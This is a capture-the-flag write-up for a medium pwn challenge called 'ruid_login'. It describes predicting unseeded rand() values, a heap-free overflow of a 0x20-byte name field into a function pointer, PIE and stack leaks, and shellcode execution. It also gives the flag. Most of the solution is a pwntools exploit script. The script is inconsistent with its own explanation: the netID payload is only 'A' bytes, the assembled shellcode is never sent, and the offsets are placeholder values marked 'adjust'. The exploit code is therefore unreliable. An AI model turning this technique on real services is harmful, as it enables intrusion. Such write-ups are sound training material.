---
ctf: ScarletCTF 2026
category: pwn
difficulty: medium
points: 200
flag: RUSEC{w0w_th4ts_such_a_l0ng_net1D_w4it_w4it_wh4ts_g0ing_0n_uh_0h}
techniques:
  - buffer-overflow
  - rng-prediction
  - pie-leak
  - stack-leak
  - shellcode-injection
tools:
  - pwntools
  - gdb
---

# ruid_login

## Description

The service is a simple login system with two staff users (Professor and Dean). Each staff entry stores a fixed-size name buffer, a function pointer for the role action, and a random RUID generated with `rand()` (no `srand`). The Dean can edit a staff member name, and the edit uses `read(0, ..., 0x29)` into a 0x20-byte name field, allowing a controlled overflow into the function pointer.

## Solution

### Step 1: Predict RUIDs

Since `rand()` is unseeded (glibc defaults), the RUIDs are deterministic:

- **Professor:** `1804289383`
- **Dean:** `846930886`

### Step 2: Leak PIE base

Use Dean to edit the Professor's name with exactly 32 bytes. Since the name field is 0x20 bytes and not null-terminated, listing staff will print past the name buffer and leak the Professor's function pointer.

### Step 3: Leak stack address

Overwrite the Professor's function pointer to `puts@plt`. When we log in as Professor, it calls `puts` with a stack pointer in RSI, leaking a stack address.

### Step 4: Execute shellcode

The initial netID input is stored on the stack. We inject shellcode there, then overwrite the Dean's function pointer to point at our shellcode buffer.

### Exploit Code

```python
from pwn import *

context.arch = 'amd64'

p = remote('scarletctf.ru.edu', 1338)

# Step 1: Login as Dean with predicted RUID
p.sendlineafter(b'netID: ', b'A' * 200)  # Inject shellcode in netID buffer
p.sendlineafter(b'RUID: ', b'846930886')

# Step 2: Edit Professor's name (leak PIE via function pointer)
p.sendlineafter(b'> ', b'1')  # Edit
p.sendlineafter(b'modify: ', b'1804289383')  # Professor RUID
p.sendafter(b'name: ', b'A' * 32)  # Fill buffer, leak next 8 bytes

p.sendlineafter(b'> ', b'2')  # List
pie_leak = u64(p.recvuntil(b'Professor')[-14:-6])
pie_base = pie_leak - 0x1234  # Offset to base (adjust)

log.info(f'PIE base: {hex(pie_base)}')

# Step 3: Overwrite Professor's function to puts@plt
puts_plt = pie_base + 0xabc  # Adjust offset
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'modify: ', b'1804289383')
p.sendafter(b'name: ', b'A' * 32 + p64(puts_plt))

# Login as Professor to leak stack
p.sendlineafter(b'> ', b'3')  # Login
p.sendlineafter(b'RUID: ', b'1804289383')
stack_leak = u64(p.recv(6).ljust(8, b'\x00'))
log.info(f'Stack leak: {hex(stack_leak)}')

# Step 4: Calculate shellcode address and execute
shellcode_addr = stack_leak - 0x200  # Offset to netID buffer
shellcode = asm(shellcraft.sh())

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'modify: ', b'846930886')  # Dean RUID
p.sendafter(b'name: ', b'A' * 32 + p64(shellcode_addr))

p.sendlineafter(b'> ', b'3')  # Login as Dean
p.sendlineafter(b'RUID: ', b'846930886')

p.interactive()
```

## Key Techniques

- **Unseeded RNG prediction** - Deterministic `rand()` values
- **Buffer overflow** - 0x29 bytes into 0x20 buffer
- **PIE leak** - Via uninitialized/overflowed function pointer
- **Stack leak** - Via controlled `puts` call
- **Shellcode injection** - Into netID buffer on stack

